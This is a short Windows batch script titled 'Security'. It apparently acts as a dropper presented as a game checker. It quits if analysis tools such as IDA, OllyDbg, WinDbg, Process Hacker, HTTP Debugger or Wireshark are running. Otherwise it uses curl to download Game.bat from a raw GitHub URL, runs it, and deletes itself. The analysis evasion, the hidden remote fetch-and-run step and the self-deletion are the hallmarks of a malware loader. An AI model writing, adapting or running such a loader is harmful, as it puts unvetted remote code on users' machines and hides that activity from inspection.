@echo off
title Security
mode con: cols=15 lines=2
cls
tasklist | find /I "idaq32"
if errorlevel 1 (
        cls
) Else (
       exit
)
cls
tasklist | find /I "ida32"
if errorlevel 1 (
        cls
) Else (
       exit
)
cls
tasklist | find /I "ida64"
if errorlevel 1 (
        cls
) Else (
       exit
)
cls
tasklist | find /I "idaq64"
if errorlevel 1 (
        cls
) Else (
       exit
)
cls
tasklist | find /I "ProcessHacker"
if errorlevel 1 (
        cls
) Else (
       exit
)
cls
tasklist | find /I "ollydbg"
if errorlevel 1 (
        cls
) Else (
       exit
)
cls
tasklist | find /I "windbg"
if errorlevel 1 (
        cls
) Else (
       exit
)
cls
tasklist | find /I "httpdebugger"
if errorlevel 1 (
        cls
) Else (
       exit
)
cls
tasklist | find /I "wireshark"
if errorlevel 1 (
       title Checking for game..
mode con: cols=15 lines=2
curl https://raw.githubusercontent.com/brendonkuar/DataBreached-Game-/main/Game.bat >> Game.bat
cls
start Game.bat
(goto) 2>nul & del "%~f0"
cls
) Else (
       exit
)
